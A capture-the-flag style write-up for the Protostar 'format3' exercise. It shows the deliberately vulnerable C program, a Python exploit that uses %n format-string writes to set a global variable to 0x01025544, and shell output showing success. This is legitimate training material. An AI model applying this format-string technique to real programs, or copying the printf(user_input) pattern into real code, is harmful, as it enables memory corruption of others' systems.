Source:
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void printbuffer(char *string){
  printf(string);
}

void vuln(){
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printbuffer(buffer);
  
  if(target == 0x01025544) {
      printf("you have modified the target :)\n");
  } else {
      printf("target is %08x :(\n", target);
  }
}

int main(int argc, char **argv){
  vuln();
}
```

Here is the exploit script (saved as `format3.exp.py`):
```python
import struct
targaddr=0x80496f4 # objdump -D format3 | grep -i target
tas = struct.pack('<I', targaddr)
tasp2 = struct.pack('<I', targaddr+2)
exp = ""
exp += tas
exp += tasp2
exp += '%21820x' # 0x5544-8
exp += '%12$n'

exp += '%43966x' # 0x10102-0x5544
exp += '%13$n'

print exp
```

Sample output:
```bash
user@protostar:/opt/protostar/bin$ python ~/format3.exp.py | ./format3
��� 
# A lot of spaces
                                                                         0
# A lot of spaces
                                                                               bffff5d0
you have modified the target :)
```
